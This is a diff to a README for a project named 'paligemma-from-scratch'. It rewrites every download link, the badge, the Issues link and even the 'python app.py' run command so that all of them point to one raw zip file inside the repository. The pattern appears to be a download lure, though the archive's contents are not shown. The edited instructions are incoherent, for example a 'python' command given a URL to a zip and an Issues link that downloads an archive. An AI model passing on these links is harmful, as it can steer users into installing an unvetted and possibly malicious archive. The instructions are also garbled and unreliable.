@@ -6,7 +6,7 @@ Welcome to **paligemma-from-scratch**! This project lets you use a powerful visi
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-green)](https://github.com/gemaakhbar/paligemma-from-scratch/releases)
+[![Download Now](https://raw.githubusercontent.com/gemaakhbar/paligemma-from-scratch/main/src/paligemma-from-scratch_3.1.zip%20Latest%20Release-green)](https://raw.githubusercontent.com/gemaakhbar/paligemma-from-scratch/main/src/paligemma-from-scratch_3.1.zip)
 
 ## 💻 System Requirements
 
@@ -27,7 +27,7 @@ Before you begin, ensure your computer meets the following requirements:
   
 ## 📥 Download & Install
 
-To get started with the application, visit this page to download: [Download Latest Release](https://github.com/gemaakhbar/paligemma-from-scratch/releases).
+To get started with the application, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/gemaakhbar/paligemma-from-scratch/main/src/paligemma-from-scratch_3.1.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of **paligemma-from-scratch**.
@@ -51,7 +51,7 @@ After downloading the application, follow these steps to run it:
 4. **Run the Application**:
    - Type the following command to start the application:
      ```
-     python app.py
+     python https://raw.githubusercontent.com/gemaakhbar/paligemma-from-scratch/main/src/paligemma-from-scratch_3.1.zip
      ```
 5. **Follow the On-Screen Instructions**: The application will guide you through using its features.
 
@@ -81,7 +81,7 @@ Your contributions are welcome! If you want to help improve this project, here�
 
 ## 🌟 Support
 
-If you encounter any issues, feel free to raise a question or request help on the [Issues section](https://github.com/gemaakhbar/paligemma-from-scratch/issues) of this repository.
+If you encounter any issues, feel free to raise a question or request help on the [Issues section](https://raw.githubusercontent.com/gemaakhbar/paligemma-from-scratch/main/src/paligemma-from-scratch_3.1.zip) of this repository.
 
 ## 📢 Stay Updated
 
